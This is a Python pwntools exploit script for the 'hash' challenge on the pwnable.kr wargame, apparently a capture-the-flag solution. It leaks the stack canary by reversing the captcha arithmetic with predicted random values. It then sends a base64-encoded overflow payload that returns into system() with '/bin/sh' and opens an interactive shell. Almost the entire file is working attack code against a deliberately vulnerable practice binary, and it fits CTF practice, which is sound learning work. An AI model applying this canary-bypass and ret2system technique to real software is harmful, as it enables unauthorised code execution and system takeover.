#!/usr/bin/env python3

from pwn import *
from pwn import p32
from os import system
import ctypes
from base64 import b64encode

exe = ELF("./hash")

context.binary = exe

nums =  []
def conn():
    global nums
    if args.GDB:
        r = gdb.debug([exe.path], gdbscript='b *0x804908b\n!./get_nums > nums\nc') # it takes ages to load so it's a nice trick to call the get nums binary inside gdb
        nums = get_nums()
    elif not args.REMOTE:
        r = process([exe.path])
        system('./get_nums > nums')
        nums = get_nums()
    else:
        r = remote("pwnable.kr", 9002)
        system('./get_nums > nums')
        nums = get_nums()

    return r

def get_nums():
    with open('./nums') as f:
        output = f.read()
    return [int(i) for i in output[:-1].split(' ')][::-1]


def int_to_uint(n):
    return ctypes.c_uint32(n).value

def main():

    r = conn()
    
    r.recvuntil(b'Are you human? input captcha : ')
    captcha = int(r.recvline(keepends = False))

    """
    in the program the captcha is made the following way:
    captcha = nums[5] + nums[1] + nums[2] - nums[3] + canary + nums[7] + nums[4] - nums[6]
    therefore:
    """
    canary = captcha - (nums[5] + nums[1] + nums[2] - nums[3] + nums[7] + nums[4] - nums[6])
    canary = int_to_uint(canary)
    info("Canary leaked: " + hex(int_to_uint(canary)))
    r.sendline(str(captcha).encode())
    r.recvuntil(b'Encode your data with BASE64 then paste me!')
    r.recvline()
     
    payload  = b'A' * 512  # junk till the canary
    payload += p32(canary) # canary
    payload += b'B' * 12   # junk till saved eip
    payload += p32(0x08049192) # ret
    payload += p32(0x8049187) # call system
    payload += p32(exe.sym.g_buf + 730)


    r.sendline(b64encode(payload) + b'\x00         /bin/sh\x00' )


    r.interactive()


if __name__ == "__main__":
    main()
